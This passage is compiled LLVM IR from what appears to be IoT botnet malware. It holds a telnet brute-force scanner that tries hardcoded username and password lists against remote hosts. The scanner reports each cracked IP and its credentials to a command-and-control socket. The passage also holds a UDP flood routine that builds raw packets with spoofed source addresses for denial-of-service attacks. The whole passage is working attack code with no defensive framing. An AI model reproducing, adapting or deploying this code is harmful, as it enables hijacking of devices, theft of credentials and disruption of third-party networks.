  store i32 4, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %117 = load i32, i32* %103, align 16
  %118 = call i32 @getsockopt(i32 %117, i32 1, i32 4, i8* nonnull %38, i32* nonnull %4) #3
  %119 = load i32, i32* %5, align 4
  %120 = icmp eq i32 %119, 0
  %121 = load i32, i32* %103, align 16
  br i1 %120, label %124, label %122

; <label>:122:                                    ; preds = %116
  %123 = call i32 @sclose(i32 %121)
  br label %.sink.split

; <label>:124:                                    ; preds = %116
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 3, i8* null) #3
  %126 = and i32 %125, -2049
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 4, i32 %126) #3
  store i32 0, i32* %96, align 4
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 7
  store i16 0, i16* %128, align 16
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 8
  %130 = load i8*, i8** %129, align 8
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %41, align 8
  br label %415

; <label>:131:                                    ; preds = %101
  %132 = load i32, i32* %103, align 16
  %133 = call i32 @sclose(i32 %132)
  br label %.sink.split

.sink.split:                                      ; preds = %122, %131
  store i8 0, i8* %41, align 8
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %134, align 1
  br label %135

; <label>:135:                                    ; preds = %101, %.sink.split
  %136 = load i32, i32* %96, align 4
  %137 = add i32 %136, 5
  %138 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %139 = icmp ult i32 %137, %138
  br i1 %139, label %140, label %415

; <label>:140:                                    ; preds = %135
  %141 = load i32, i32* %103, align 16
  %142 = call i32 @sclose(i32 %141)
  store i8 0, i8* %41, align 8
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %143, align 1
  br label %415

; <label>:144:                                    ; preds = %.lr.ph
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 6
  %146 = load i32, i32* %145, align 4
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %148, label %150

; <label>:148:                                    ; preds = %144
  %149 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %149, i32* %145, align 4
  br label %150

; <label>:150:                                    ; preds = %148, %144
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %152 = load i32, i32* %151, align 16
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 8
  %154 = load i8*, i8** %153, align 8
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 7
  %156 = load i16, i16* %155, align 16
  %157 = zext i16 %156 to i32
  %158 = call i32 @readUntil(i32 %152, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %154, i32 1024, i32 %157)
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %162, label %160

; <label>:160:                                    ; preds = %150
  store i32 0, i32* %145, align 4
  store i16 0, i16* %155, align 16
  %161 = load i8*, i8** %153, align 8
  call void @llvm.memset.p0i8.i64(i8* %161, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %41, align 8
  br label %415

; <label>:162:                                    ; preds = %150
  %163 = load i8*, i8** %153, align 8
  %164 = call i64 @strlen(i8* %163) #14
  %165 = trunc i64 %164 to i16
  store i16 %165, i16* %155, align 16
  %166 = load i32, i32* %145, align 4
  %167 = add i32 %166, 30
  %168 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %169 = icmp ult i32 %167, %168
  br i1 %169, label %170, label %415

; <label>:170:                                    ; preds = %162
  %171 = load i32, i32* %151, align 16
  %172 = call i32 @sclose(i32 %171)
  store i8 0, i8* %41, align 8
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %173, align 1
  br label %415

; <label>:174:                                    ; preds = %.lr.ph
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 4
  %178 = load i8, i8* %177, align 2
  %179 = zext i8 %178 to i64
  %180 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %179
  %181 = load i8*, i8** %180, align 8
  %182 = call i64 @strlen(i8* %181) #14
  %183 = call i64 @send(i32 %176, i8* %181, i64 %182, i32 16384) #3
  %184 = icmp slt i64 %183, 0
  %185 = load i32, i32* %175, align 16
  br i1 %184, label %186, label %189

; <label>:186:                                    ; preds = %174
  %187 = call i32 @sclose(i32 %185)
  store i8 0, i8* %41, align 8
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %188, align 1
  br label %415

; <label>:189:                                    ; preds = %174
  %190 = call i64 @send(i32 %185, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i64 0, i64 0), i64 2, i32 16384) #3
  %191 = icmp slt i64 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %189
  %193 = load i32, i32* %175, align 16
  %194 = call i32 @sclose(i32 %193)
  store i8 0, i8* %41, align 8
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %195, align 1
  br label %415

; <label>:196:                                    ; preds = %189
  store i8 4, i8* %41, align 8
  br label %415

; <label>:197:                                    ; preds = %.lr.ph
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 6
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, 0
  br i1 %200, label %201, label %203

; <label>:201:                                    ; preds = %197
  %202 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %202, i32* %198, align 4
  br label %203

; <label>:203:                                    ; preds = %201, %197
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 8
  %207 = load i8*, i8** %206, align 8
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 7
  %209 = load i16, i16* %208, align 16
  %210 = zext i16 %209 to i32
  %211 = call i32 @readUntil(i32 %205, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %207, i32 1024, i32 %210)
  %212 = icmp eq i32 %211, 0
  br i1 %212, label %217, label %213

; <label>:213:                                    ; preds = %203
  store i32 0, i32* %198, align 4
  store i16 0, i16* %208, align 16
  %214 = load i8*, i8** %206, align 8
  %215 = call i8* @strstr(i8* %214, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0)) #14
  %216 = icmp ne i8* %215, null
  %.sink = select i1 %216, i8 5, i8 100
  store i8 %.sink, i8* %41, align 8
  call void @llvm.memset.p0i8.i64(i8* %214, i8 0, i64 1024, i32 1, i1 false)
  br label %415

; <label>:217:                                    ; preds = %203
  %218 = load i8*, i8** %206, align 8
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0)) #14
  %220 = icmp eq i8* %219, null
  br i1 %220, label %225, label %221

; <label>:221:                                    ; preds = %217
  %222 = load i32, i32* %204, align 16
  %223 = call i32 @sclose(i32 %222)
  store i8 0, i8* %41, align 8
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 0, i8* %224, align 1
  br label %415

; <label>:225:                                    ; preds = %217
  %226 = call i64 @strlen(i8* %218) #14
  %227 = trunc i64 %226 to i16
  store i16 %227, i16* %208, align 16
  %228 = load i32, i32* %198, align 4
  %229 = add i32 %228, 8
  %230 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %231 = icmp ult i32 %229, %230
  br i1 %231, label %232, label %415

; <label>:232:                                    ; preds = %225
  %233 = load i32, i32* %204, align 16
  %234 = call i32 @sclose(i32 %233)
  store i8 0, i8* %41, align 8
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %235, align 1
  br label %415

; <label>:236:                                    ; preds = %.lr.ph
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %238 = load i32, i32* %237, align 16
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 5
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i64
  %242 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %241
  %243 = load i8*, i8** %242, align 8
  %244 = call i64 @strlen(i8* %243) #14
  %245 = call i64 @send(i32 %238, i8* %243, i64 %244, i32 16384) #3
  %246 = icmp slt i64 %245, 0
  %247 = load i32, i32* %237, align 16
  br i1 %246, label %248, label %251

; <label>:248:                                    ; preds = %236
  %249 = call i32 @sclose(i32 %247)
  store i8 0, i8* %41, align 8
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %250, align 1
  br label %415

; <label>:251:                                    ; preds = %236
  %252 = call i64 @send(i32 %247, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i64 0, i64 0), i64 2, i32 16384) #3
  %253 = icmp slt i64 %252, 0
  br i1 %253, label %254, label %258

; <label>:254:                                    ; preds = %251
  %255 = load i32, i32* %237, align 16
  %256 = call i32 @sclose(i32 %255)
  store i8 0, i8* %41, align 8
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %257, align 1
  br label %415

; <label>:258:                                    ; preds = %251
  store i8 6, i8* %41, align 8
  br label %415

; <label>:259:                                    ; preds = %.lr.ph
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 6
  %261 = load i32, i32* %260, align 4
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %263, label %265

; <label>:263:                                    ; preds = %259
  %264 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %264, i32* %260, align 4
  br label %265

; <label>:265:                                    ; preds = %263, %259
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %267 = load i32, i32* %266, align 16
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 8
  %269 = load i8*, i8** %268, align 8
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 7
  %271 = load i16, i16* %270, align 16
  %272 = zext i16 %271 to i32
  %273 = call i32 @readUntil(i32 %267, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %269, i32 1024, i32 %272)
  %274 = icmp eq i32 %273, 0
  br i1 %274, label %292, label %275

; <label>:275:                                    ; preds = %265
  store i32 0, i32* %260, align 4
  store i16 0, i16* %270, align 16
  %276 = load i8*, i8** %268, align 8
  %277 = call i8* @strstr(i8* %276, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i64 0, i64 0)) #14
  %278 = icmp eq i8* %277, null
  br i1 %278, label %283, label %279

; <label>:279:                                    ; preds = %275
  call void @llvm.memset.p0i8.i64(i8* %276, i8 0, i64 1024, i32 1, i1 false)
  %280 = load i32, i32* %266, align 16
  %281 = call i32 @sclose(i32 %280)
  store i8 0, i8* %41, align 8
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 0, i8* %282, align 1
  br label %415

; <label>:283:                                    ; preds = %275
  %284 = call i32 @matchPrompt(i8* %276)
  %285 = icmp eq i32 %284, 0
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %283
  call void @llvm.memset.p0i8.i64(i8* %276, i8 0, i64 1024, i32 1, i1 false)
  %287 = load i32, i32* %266, align 16
  %288 = call i32 @sclose(i32 %287)
  store i8 0, i8* %41, align 8
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %289, align 1
  br label %415

; <label>:290:                                    ; preds = %283
  store i8 7, i8* %41, align 8
  %291 = load i8*, i8** %268, align 8
  call void @llvm.memset.p0i8.i64(i8* %291, i8 0, i64 1024, i32 1, i1 false)
  br label %415

; <label>:292:                                    ; preds = %265
  %293 = load i8*, i8** %268, align 8
  %294 = call i64 @strlen(i8* %293) #14
  %295 = trunc i64 %294 to i16
  store i16 %295, i16* %270, align 16
  %296 = load i32, i32* %260, align 4
  %297 = add i32 %296, 30
  %298 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %299 = icmp ult i32 %297, %298
  br i1 %299, label %300, label %415

; <label>:300:                                    ; preds = %292
  %301 = load i32, i32* %266, align 16
  %302 = call i32 @sclose(i32 %301)
  store i8 0, i8* %41, align 8
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %303, align 1
  br label %415

; <label>:304:                                    ; preds = %.lr.ph
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %306 = load i32, i32* %305, align 16
  %307 = call i64 @send(i32 %306, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i64 0, i64 0), i64 4, i32 16384) #3
  %308 = icmp slt i64 %307, 0
  br i1 %308, label %309, label %313

; <label>:309:                                    ; preds = %304
  %310 = load i32, i32* %305, align 16
  %311 = call i32 @sclose(i32 %310)
  store i8 0, i8* %41, align 8
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %312, align 1
  br label %415

; <label>:313:                                    ; preds = %304
  store i8 8, i8* %41, align 8
  br label %415

; <label>:314:                                    ; preds = %.lr.ph
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %316 = load i32, i32* %315, align 16
  %317 = call i64 @send(i32 %316, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.30, i64 0, i64 0), i64 7, i32 16384) #3
  %318 = icmp slt i64 %317, 0
  br i1 %318, label %319, label %323

; <label>:319:                                    ; preds = %314
  %320 = load i32, i32* %315, align 16
  %321 = call i32 @sclose(i32 %320)
  store i8 0, i8* %41, align 8
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %322, align 1
  br label %415

; <label>:323:                                    ; preds = %314
  store i8 9, i8* %41, align 8
  br label %415

; <label>:324:                                    ; preds = %.lr.ph
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %326 = load i32, i32* %325, align 16
  %327 = call i64 @send(i32 %326, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i64 0, i64 0), i64 207, i32 16384) #3
  %328 = icmp slt i64 %327, 0
  br i1 %328, label %329, label %333

; <label>:329:                                    ; preds = %324
  %330 = load i32, i32* %325, align 16
  %331 = call i32 @sclose(i32 %330)
  store i8 0, i8* %41, align 8
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %332, align 1
  br label %415

; <label>:333:                                    ; preds = %324
  store i8 10, i8* %41, align 8
  br label %415

; <label>:334:                                    ; preds = %.lr.ph
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %336 = load i32, i32* %335, align 16
  %337 = call i64 @send(i32 %336, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i64 0, i64 0), i64 207, i32 16384) #3
  %338 = icmp slt i64 %337, 0
  br i1 %338, label %339, label %343

; <label>:339:                                    ; preds = %334
  %340 = load i32, i32* %335, align 16
  %341 = call i32 @sclose(i32 %340)
  store i8 0, i8* %41, align 8
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %342, align 1
  br label %415

; <label>:343:                                    ; preds = %334
  store i8 11, i8* %41, align 8
  br label %415

; <label>:344:                                    ; preds = %.lr.ph
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 6
  %346 = load i32, i32* %345, align 4
  %347 = icmp eq i32 %346, 0
  br i1 %347, label %348, label %350

; <label>:348:                                    ; preds = %344
  %349 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %349, i32* %345, align 4
  br label %350

; <label>:350:                                    ; preds = %348, %344
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %352 = load i32, i32* %351, align 16
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 8
  %354 = load i8*, i8** %353, align 8
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 7
  %356 = load i16, i16* %355, align 16
  %357 = zext i16 %356 to i32
  %358 = call i32 @readUntil(i32 %352, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %354, i32 1024, i32 %357)
  %359 = icmp eq i32 %358, 0
  br i1 %359, label %376, label %360

; <label>:360:                                    ; preds = %350
  store i32 0, i32* %345, align 4
  store i16 0, i16* %355, align 16
  %361 = load i32, i32* @mainCommSock, align 4
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 1
  %363 = load i32, i32* %362, align 4
  %364 = call i8* @inet_ntoa(i32 %363) #3
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 4
  %366 = load i8, i8* %365, align 2
  %367 = zext i8 %366 to i64
  %368 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %367
  %369 = load i8*, i8** %368, align 8
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 5
  %371 = load i8, i8* %370, align 1
  %372 = zext i8 %371 to i64
  %373 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %372
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 (i32, i8*, ...) @sockprintf(i32 %361, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i64 0, i64 0), i8* %364, i8* %369, i8* %374)
  br label %415

; <label>:376:                                    ; preds = %350
  %377 = load i32, i32* %351, align 16
  %378 = load i8*, i8** %353, align 8
  %379 = load i16, i16* %355, align 16
  %380 = zext i16 %379 to i32
  %381 = call i32 @readUntil(i32 %377, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %378, i32 1024, i32 %380)
  %382 = icmp eq i32 %381, 0
  br i1 %382, label %403, label %383

; <label>:383:                                    ; preds = %376
  store i32 0, i32* %345, align 4
  store i16 0, i16* %355, align 16
  %384 = load i32, i32* @mainCommSock, align 4
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 1
  %386 = load i32, i32* %385, align 4
  %387 = call i8* @inet_ntoa(i32 %386) #3
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 4
  %389 = load i8, i8* %388, align 2
  %390 = zext i8 %389 to i64
  %391 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %390
  %392 = load i8*, i8** %391, align 8
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 5
  %394 = load i8, i8* %393, align 1
  %395 = zext i8 %394 to i64
  %396 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %395
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 (i32, i8*, ...) @sockprintf(i32 %384, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i64 0, i64 0), i8* %387, i8* %392, i8* %397)
  %399 = load i8*, i8** %353, align 8
  call void @llvm.memset.p0i8.i64(i8* %399, i8 0, i64 1024, i32 1, i1 false)
  %400 = load i32, i32* %351, align 16
  %401 = call i32 @sclose(i32 %400)
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %402, align 1
  store i8 0, i8* %41, align 8
  br label %415

; <label>:403:                                    ; preds = %376
  %404 = load i8*, i8** %353, align 8
  %405 = call i64 @strlen(i8* %404) #14
  %406 = trunc i64 %405 to i16
  store i16 %406, i16* %355, align 16
  %407 = load i32, i32* %345, align 4
  %408 = add i32 %407, 30
  %409 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %410 = icmp ult i32 %408, %409
  br i1 %410, label %411, label %415

; <label>:411:                                    ; preds = %403
  %412 = load i32, i32* %351, align 16
  %413 = call i32 @sclose(i32 %412)
  store i8 0, i8* %41, align 8
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %39, i32 3
  store i8 1, i8* %414, align 1
  br label %415

; <label>:415:                                    ; preds = %.lr.ph, %196, %258, %313, %323, %333, %343, %93, %90, %140, %135, %170, %162, %232, %225, %300, %292, %411, %403, %69, %383, %360, %339, %329, %319, %309, %290, %286, %279, %254, %248, %221, %213, %192, %186, %160, %124, %68
  %416 = add nsw i32 %.1178, 1
  %417 = icmp slt i32 %416, %12
  %brmerge = or i1 %417, %31
  %.mux = select i1 %417, i32 %416, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %415
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #3
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %39 = add nsw i32 %38, %2
  %40 = sext i32 %4 to i64
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %42 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %40, i32 0, %struct.sockaddr* nonnull %41, i32 16) #3
  %43 = icmp eq i32 %.058, %5
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %.backedge
  br i1 %10, label %45, label %48

; <label>:45:                                     ; preds = %44
  %46 = call i32 @rand_cmwc()
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %18, align 2
  br label %48

; <label>:48:                                     ; preds = %45, %44
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %50 = icmp sgt i32 %49, %39
  br i1 %50, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:51:                                     ; preds = %.backedge
  %52 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %51, %48
  %.058.be = phi i32 [ %52, %51 ], [ 0, %48 ]
  br label %.backedge

; <label>:53:                                     ; preds = %22
  %54 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0))
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  store i32 1, i32* %8, align 4
  %60 = bitcast i32* %8 to i8*
  %61 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* nonnull %60, i32 4) #3
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %59
  br label %.preheader

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.05962, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #3
  %70 = call i32 @rand() #3
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.060 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @getRandomIP(i32 %.060)
  %85 = call i32 @htonl(i32 %84) #17
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #17
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #17
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %102 = phi i32 [ %96, %95 ], [ %100, %97 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
